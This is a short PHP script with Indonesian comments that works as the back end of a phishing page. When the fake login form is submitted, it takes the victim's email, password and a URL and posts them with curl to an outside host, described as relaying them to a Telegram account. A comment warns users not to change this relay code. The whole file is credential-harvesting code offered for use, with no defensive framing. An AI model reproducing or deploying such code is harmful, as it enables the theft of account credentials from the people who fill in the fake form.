<?php

/** START SEND RESULT TO TELEGRAM ACCOUNT **/
if(isset($_POST['login'])) /** JIKA BUTTON LOGIN TERSUBMIT DENGAN METODE POST **/ {
    $email = $_POST['email']; /** MENERIMA EMAIL **/
    $pass = $_POST['password']; /** MENERIMA PASSWORD **/
    $link = $_POST['link']; /** MENERIMA URL **/
    if(!empty($email) || !empty($pass)) /** JIKA SEMUA DATA TERISI **/ {
        $ch = curl_init();

        /** CODE BAWAAN DARI IDHAAMPEDIA
         * JANGAN GANTI APAPUN AGAR RESULT MASUK DENGAN AMAN XD
        **/
        curl_setopt($ch, CURLOPT_URL,"http://demo.idhaampedia.com/idhaampedia-telegram.php"); 
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,
                    "email=$email&password=$pass&link=$link");
        
        /** MENERIMA RESPON DARI SERVER **/
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $server_output = curl_exec($ch);
        curl_close ($ch);
        /** AKHIR CODE BAWAAN DARI IDHAAMPEDIA
         * JANGAN GANTI APAPUN AGAR RESULT MASUK DENGAN AMAN XD
        **/
        
        /** HASIL TOD **/
        if ($server_output == "OK") /** JIKA GAGAL **/ { 
            echo "<script>alert('Gagal: Maaf, IdhaamPedia gabisa kirim resultnya'); document.location='index.php'; </script>";
        } else /** JIKA BERHASIL **/ { 
            echo "<script>alert('Berhasil: Horeee, Result berhasil dikirim');</script>";
        }
    } 
}
?>